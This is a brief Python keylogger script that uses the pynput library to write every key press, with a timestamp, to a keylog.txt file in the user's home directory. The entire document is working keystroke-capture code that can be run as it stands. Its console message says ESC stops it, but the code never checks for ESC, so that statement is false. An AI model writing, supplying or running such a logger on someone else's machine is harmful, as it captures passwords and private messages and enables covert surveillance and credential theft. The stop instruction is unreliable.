from pynput import keyboard
import logging
import os

# Define log file path (saves to user's home directory)
log_directory = os.path.expanduser("~")
log_file = os.path.join(log_directory, "keylog.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special Key {key} pressed')

def main():
    print("Keylogger is running. Press ESC to stop (run in console environment).")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
